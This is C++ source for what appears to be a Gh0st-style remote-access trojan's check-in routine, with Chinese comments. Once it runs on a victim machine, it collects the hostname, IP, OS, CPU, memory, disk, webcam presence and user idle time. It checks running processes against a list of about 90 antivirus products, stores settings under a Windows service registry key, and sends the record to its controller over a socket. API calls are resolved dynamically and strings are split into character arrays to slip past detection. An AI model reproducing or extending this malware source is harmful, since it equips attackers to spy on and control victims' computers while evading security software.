#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "iphlpapi.lib")
#include <iprtrmib.h>
#include <iphlpapi.h>

//枚举视频设备
//////////////////////////////////////////////////////////
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#include "stdafx.h"
#pragma comment(lib, "strmiids.lib")
/**********************************/
UINT EnumDevices()
{
	HINSTANCE Ole32 = LoadLibrary("Ole32.dll"); 
	
    typedef void (WINAPI *TCoInitialize)(LPVOID ); 
    TCoInitialize MyCoInitialize = (TCoInitialize)GetProcAddress(Ole32, "CoInitialize");

    typedef void (WINAPI *TCoUninitialize)(void ); 
    TCoUninitialize MyCoUninitialize = (TCoUninitialize)GetProcAddress(Ole32, "CoUninitialize");
 
    typedef HRESULT (WINAPI *TCoCreateInstance)(IN REFCLSID , IN LPUNKNOWN ,IN DWORD , IN REFIID , OUT LPVOID FAR* ); 
	
    TCoCreateInstance MyCoCreateInstance = (TCoCreateInstance)GetProcAddress(Ole32, "CoCreateInstance");

	HINSTANCE Oleaut32 = LoadLibrary("Oleaut32.dll"); 

    typedef void (WINAPI *TSysFreeString)(BSTR ); 
    TSysFreeString MySysFreeString = (TSysFreeString)GetProcAddress(Oleaut32, "SysFreeString");

	MyCoInitialize(NULL);    //COM 库初始化
	UINT nCam = 0;

	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = MyCoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				MySysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	MyCoUninitialize();                   //卸载COM库

	if (Ole32)
		FreeLibrary(Ole32);

	if (Oleaut32)
		FreeLibrary(Oleaut32);
	
	return nCam;
}
//////////////////////////////////////////////////////////

void CPUClockMhzt(char *cTemp)
{
// 	char  dwCPUMhz[10]={0};
//	ReadRegEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",  "~MHz", REG_DWORD, (char *)dwCPUMhz, NULL, sizeof(DWORD), 0);

	SYSTEM_INFO siSysInfo; 
	//复制硬件信息到SYSTEM_INFO结构变量
	GetSystemInfo(&siSysInfo); 	
	
//	wsprintfA(cTemp, "%d*%sMHz", siSysInfo.dwNumberOfProcessors,dwCPUMhz);
	wsprintfA(cTemp, "%d", siSysInfo.dwNumberOfProcessors);	
	return;
}

//extern DLLSERVER_INFO dll_info;

void ReadRegExg(LPCTSTR lpServiceName ,LPTSTR lpSame ,LPTSTR lpBuffer, UINT uSize)
{
	
	
	char	strSubKey[1024]={0};
	
	
	
	memset(lpBuffer, 0, uSize);
	
	memset(strSubKey, 0, sizeof(strSubKey));
	
	
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	
	
	
	
	
	wsprintf(strSubKey, JYvni08,lpServiceName);
	
	
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,lpSame, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
// 	char	strSubKey[1024];
// 	memset(lpBuffer, 0, uSize);
// 	memset(strSubKey, 0, sizeof(strSubKey));
// 	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
// 	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,"Remark", REG_SZ, lpBuffer, NULL,uSize, 0);
// 
// 	if (lstrlen(lpBuffer) == 0)
// 	m_gFunc.gethostname(lpBuffer, uSize);	
// 	return lstrlen(lpBuffer);

	char UtKoF13[] = {'H','o','s','t','\0'};
	ReadRegExg(lpServiceName ,UtKoF13 ,lpBuffer, uSize);
	
	
	if (lstrlen(lpBuffer) == 0)
	{
		
		gethostname(lpBuffer, uSize);
		
	}
	
	
	return lstrlen(lpBuffer);
}

UINT GetGroupName(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	
	
	char UtKoF15[] = {'C','o','n','n','e','c','t','G','r','o','u','p','\0'};
	ReadRegExg(lpServiceName ,UtKoF15 ,lpBuffer, uSize);
	
	
	if (lstrlen(lpBuffer) == 0)
	{
		
		lstrcpy(lpBuffer,"Default");
	}
	
	
	return lstrlen(lpBuffer);
}

UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	
	ReadRegExg(lpServiceName ,JYvni04 ,lpBuffer, uSize);
	
	if (lstrlen(lpBuffer) == 0)
	{
		
		lstrcpy(lpBuffer,"无信息");
	}
	
	
	return lstrlen(lpBuffer);
}


BOOL IsWow64() 
{ 
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); 
    LPFN_ISWOW64PROCESS fnIsWow64Process; 
    BOOL bIsWow64 = FALSE; 
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( kernel32,"IsWow64Process"); 

	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 

    if (NULL != fnIsWow64Process) 
    { 
        fnIsWow64Process(myGetCurrentProcess(),&bIsWow64);
    }

 	if(kernel32)
 		FreeLibrary(kernel32);
    return bIsWow64; 
}


#include <process.h>
#include <tlhelp32.h>

char* MDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x1;
	}
	return data;
}
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE;
void GetAntivirus(char *AllName)
{	
	
	AYSDFE g_AntiVirus_Data[90] = 
	{
		{"360tray.exe",    "360安全卫士"},
		{"360sd.exe",      "360杀毒"},
		{"a2guard.exe",    "a-squared杀毒"},
		{"ad-watch.exe",    "Lavasoft杀毒"},
		{"cleaner8.exe",    "The Cleaner杀毒"},
		{"vba32lder.exe",    "vb32杀毒"},
		{"MongoosaGUI.exe",    "Mongoosa杀毒"},
		{"CorantiControlCenter32.exe",    "Coranti2012杀毒"},
		{"F-PROT.EXE",    "F-PROT杀毒"},
		{"CMCTrayIcon.exe",    "CMC杀毒"},
		{"K7TSecurity.exe",    "K7杀毒"},
		{"UnThreat.exe",    "UnThreat杀毒"},
		{"CKSoftShiedAntivirus4.exe",    "Shield Antivirus杀毒"},
		{"AVWatchService.exe",    "VIRUSfighter杀毒"},
		{"ArcaTasksService.exe",    "ArcaVir杀毒"},
		{"iptray.exe",    "Immunet杀毒"},
		{"PSafeSysTray.exe",    "PSafe杀毒"},
		{"nspupsvc.exe",    "nProtect杀毒"},
		{"SpywareTerminatorShield.exe",    "SpywareTerminator杀毒"},
		{"BKavService.exe",    "Bkav杀毒"},
		{"MsMpEng.exe",    "Microsoft Security Essentials"},
		{"SBAMSvc.exe",    "VIPRE"},
		{"ccSvcHst.exe",    "Norton杀毒"},
		{"QQ.exe",    "QQ"},
		{"f-secure.exe",    "冰岛"},
		{"avp.exe",        "卡巴斯基"},
		{"KvMonXP.exe",    "江民杀毒"},
		{"RavMonD.exe",    "瑞星杀毒"},
		{"Mcshield.exe",   "麦咖啡"},
		{"egui.exe",       "NOD32"},
		{"kxetray.exe",    "金山毒霸"}, 
		{"knsdtray.exe",   "可牛杀毒"},
		{"TMBMSRV.exe",    "趋势杀毒"},
		{"avcenter.exe",   "Avira(小红伞)"},
		{"ashDisp.exe",    "Avast网络安全"}, 
		{"rtvscan.exe",    "诺顿杀毒"}, 
		{"ksafe.exe",      "金山卫士"}, 
		{"QQPCRTP.exe",    "QQ电脑管家"},
		{"Miner.exe",    "流量矿石"},
		{"AYAgent.aye",    "韩国胶囊"},
		{"patray.exe",    "安博士"},
		{"V3Svc.exe",    "安博士V3"},
		{"avgwdsvc.exe",    "AVG杀毒"},
		{"ccSetMgr.exe",    "赛门铁克"},
		{"QUHLPSVC.EXE",    "QUICK HEAL杀毒"},
		{"mssecess.exe",    "微软杀毒"},
		{"SavProgress.exe",    "Sophos杀毒"},
		{"fsavgui.exe",    "F-Secure杀毒"},
		{"vsserv.exe",    "比特梵德"},
		{"remupd.exe",    "熊猫卫士"},
		{"FortiTray.exe",    "飞塔"},
		{"safedog.exe",    "安全狗"},
		{"parmor.exe",    "木马克星"},
		{"beikesan.exe",    "贝壳云安全"},
		{"KSWebShield.exe",    "金山网盾"},
		{"TrojanHunter.exe",    "木马猎手"},
		{"GG.exe",    "巨盾网游安全盾"},
		{"adam.exe",    "绿鹰安全精灵"},
		{"AST.exe",    "超级巡警"},
		{"ananwidget.exe",    "墨者安全专家"},
		{"AVK.exe",    "GData"},
		{"ccapp.exe",    "Symantec Norton"},
		{"avg.exe",    "AVG Anti-Virus"},
		{"spidernt.exe",    "Dr.web"},
		{"Mcshield.exe",    "Mcafee"},
		{"avgaurd.exe",    "Avira Antivir"},
		{"F-PROT.exe",    "F-Prot AntiVirus"},
		{"vsmon.exe",    "ZoneAlarm"},
		{"avp.exee",    "Kaspersky"},
		{"cpf.exe",    "Comodo"},
		{"outpost.exe",    "Outpost Firewall"},
		{"rfwmain.exe",    "瑞星防火墙"},
		{"kpfwtray.exe",    "金山网镖"},
		{"FYFireWall.exe",    "风云防火墙"},
		{"MPMon.exe",    "微点主动防御"},
		{"pfw.exe",    "天网防火墙"},
		{"S.exe",    "在抓鸡"},
		{"1433.exe",    "在扫1433"},
		{"DUB.exe",    "在爆破"},
		{"ServUDaemon.exe",    "发现S-U"},
		{"BaiduSdSvc.exe",    "百度杀软"},
		{"  ",    "  "}
};
	typedef BOOL (WINAPI *TProcess32First)(HANDLE ,LPPROCESSENTRY32); 
	typedef BOOL (WINAPI *TProcess32Next)(HANDLE ,LPPROCESSENTRY32); 
	
	typedef HANDLE (WINAPI *TCreateToolhelp32Snapshot)(DWORD ,DWORD); 
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	TCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)GetProcAddress(kernel32, "CreateToolhelp32Snapshot"); 
	TProcess32First myProcess32First = (TProcess32First)GetProcAddress(kernel32, "Process32First"); 
	TProcess32Next myProcess32Next = (TProcess32Next)GetProcAddress(kernel32, "Process32Next"); 

	
	PROCESSENTRY32 pe; 
	DWORD dwRet;
	HANDLE hSP = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	 int t=0;
	if (hSP)
	{
		for (;;)
		{
			pe.dwSize = sizeof( pe );
			
			if (strstr(g_AntiVirus_Data[t].Course, " " ))
				break;

			for (dwRet = myProcess32First(hSP, &pe); dwRet; dwRet = myProcess32Next(hSP, &pe))
			{
				if (lstrcmpi( g_AntiVirus_Data[t].Course , pe.szExeFile) == 0)
				{
					lstrcatA(AllName , g_AntiVirus_Data[t].Name);
					lstrcatA(AllName , " ");
				
					break;
				}
			}

            t++;
 
		}
	}
	
	CloseHandle(hSP);
	
	if (lstrlen(AllName) == 0)
		lstrcpy(AllName,"-/-");

	if(kernel32)
		FreeLibrary(kernel32);

	return;
}

BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
			dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}


int GetNetwork()//获取网络速率Mbps 
{
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	DWORD speed = 0; 
    DWORD dwspeed = 0;
	MIB_IFTABLE *pIfTable;
	MIB_IFROW *pIfRow;
	
	pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
	if (pIfTable == NULL) 
	{
		return 1;
	}
	dwSize = sizeof (MIB_IFTABLE);
	if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
	{
		free( pIfTable);
		pIfTable = (MIB_IFTABLE *) malloc(dwSize);
		if (pIfTable == NULL) 
		{
			return 1;
		}
	}
	if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
	{	
		pIfRow = (MIB_IFROW *) & pIfTable->table[0];
		speed = pIfRow->dwSpeed;
		dwspeed = speed/1000/1000; //mbps	
	} 
	if (pIfTable != NULL) 
	{
		free(pIfTable);
		pIfTable = NULL;
	}
	
	return dwspeed;
}

////////////////////////////////////////////////////////////////////////////
// Get System Information
// DWORD CPUClockMhz()
// {
// 	HKEY	hKey;
// 	DWORD	dwCPUMhz;
// 	DWORD	dwBytes = sizeof(DWORD);
// 	DWORD	dwType = REG_DWORD;
// 	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
// 	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
// 	RegCloseKey(hKey);
// 	return	dwCPUMhz;
// }
extern DLLSERVER_INFO dll_info;
//发送上线信息
int SendLoginInfo(HMODULE hDllModule,CClientSocket *pClient, DWORD dwSpeed)
{

	char str_ServiceName[256];
	// 登录信息
	LOGININFO	LoginInfo;
	memset(&LoginInfo,0,sizeof(LOGININFO));

	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录

	lstrcpy(str_ServiceName,dll_info.ServiceName);

// 	char ServerINIPath[MAX_PATH]={0};
// 	GetModuleFileName(NULL,ServerINIPath,sizeof(ServerINIPath));
// 	PathRemoveFileSpec(ServerINIPath);
// 	lstrcat(ServerINIPath,"\\Server.ini");
	//分组
// 	memset(LoginInfo.UpGroup,0,sizeof(LoginInfo.UpGroup));
// 	GetPrivateProfileString("INSTALL","Group","Default",LoginInfo.UpGroup,sizeof(LoginInfo.UpGroup),ServerINIPath); 
	//上线分组
	char	*UpRow = NULL;
	char Group[256];
	
	if(GetGroupName(str_ServiceName, Group, sizeof(Group))==0)      //no
	{
		UpRow = "Default";
	}
	else
	{
		UpRow=Group;
	}
	
	lstrcpy(LoginInfo.UpGroup,UpRow);

	// 主机名
	char hostname[256];
	
	GetHostRemark(str_ServiceName, hostname, sizeof(hostname));
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));

	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

	// 主机名
// 	GetPrivateProfileString("INSTALL","Remark","Default",LoginInfo.HostName,sizeof(LoginInfo.HostName),ServerINIPath); 
// 	if (strlen(LoginInfo.HostName)==0)
// 	{
// 		m_gFunc.gethostname(LoginInfo.HostName, sizeof(LoginInfo.HostName));
// 	}
// 	char hostname[256];
// 	GetHostRemark("BITS", LoginInfo.HostName, sizeof(LoginInfo.HostName));
	// CPU主频
// 	LoginInfo.CPUClockMhz1 = CPUClockMhz();
//     //CPU核心数
//  	SYSTEM_INFO siSysInfo; 
// 	//复制硬件信息到SYSTEM_INFO结构变量
//  	GetSystemInfo(&siSysInfo);
//     LoginInfo.CPUNumber=siSysInfo.dwNumberOfProcessors;
	// 操作系统
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
 	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
 	RegCloseKey(hKey);
    LoginInfo.CPUClockMhz1=(float)dwCPUMhz/1024;
	// CPU
   CPUClockMhzt(LoginInfo.CPUClockMhz);
// char qqq[100];
// wsprintf(qqq,"%d",(LoginInfo.CPUClockMhz));
// OutputDebugStringA(qqq);
	// 网卡
	LoginInfo.Mbs = GetNetwork();
	// 版本信息
	char	*lpVersion = NULL;
	lpVersion =	dll_info.Version;
	wsprintf(LoginInfo.Ver,lpVersion);
	if (lpVersion == NULL)
		wsprintf(LoginInfo.Ver,"V5.0");
	  // 内存
    MEMORYSTATUSEX	MemInfo; //用GlobalMemoryStatusEx可显示2G以上内存
	MemInfo.dwLength=sizeof(MemInfo); 
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.MemSize = (unsigned long)strMem;
   
	//硬盘空间
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10];//, strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;	
		drivertype = GetDriveType(driver);	
        if(drivertype!=DRIVE_FIXED)
			continue;		
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   		
		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
		//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //剩余磁盘
    }
	// 硬盘
	LoginInfo.DriverSize = nAllGB;
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	LoginInfo.bIsWebCam = EnumDevices(); //没有摄像头

	LoginInfo.bIsWow64  = IsWow64();
////////////////
	memset(LoginInfo.szAntivirus,0,100);

	GetAntivirus(LoginInfo.szAntivirus);
	// 用户状态
	LoginInfo.bIsActive = false;
	//是否活动
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//获取上次输入操作的时间。
	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5分钟
	{
		//当前系统已经空闲了1分钟
		LoginInfo.bIsActive = true;
	}

	//服务安装时间

//	GetPrivateProfileString("INSTALL","Time","Error",LoginInfo.szInstallTime,sizeof(LoginInfo.szInstallTime),ServerINIPath); 

	GetMarkTime(str_ServiceName, LoginInfo.szInstallTime, sizeof(LoginInfo.szInstallTime));   // no

	//通讯密码
	lstrcpy(LoginInfo.szOnlinePass,	dll_info.SocketHead);

// 	char jsbHj10[] = {'%','d','\0'};
// 	DWORD t=GetTickCount();
// 	char day[100];
// 	char hour[100];
// 	char min[100];
// 	wsprintf(day, jsbHj10, t/86400000);
// 	t%=86400000;
// 	wsprintf(hour,jsbHj10, t/3600000);
// 	t%=3600000;
// 	wsprintf(min, jsbHj10, t/60000);
// 	
// 	char *d="天";
// 	char *h="时";
// 	char *m="分";
// 	char UZftZ01[] = {'%','s','%','s','%','s','%','s','%','s','%','s','\0'};
//  
// 	wsprintf(LoginInfo.szRunTime,UZftZ01, day,d,hour,h,min,m);



	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}

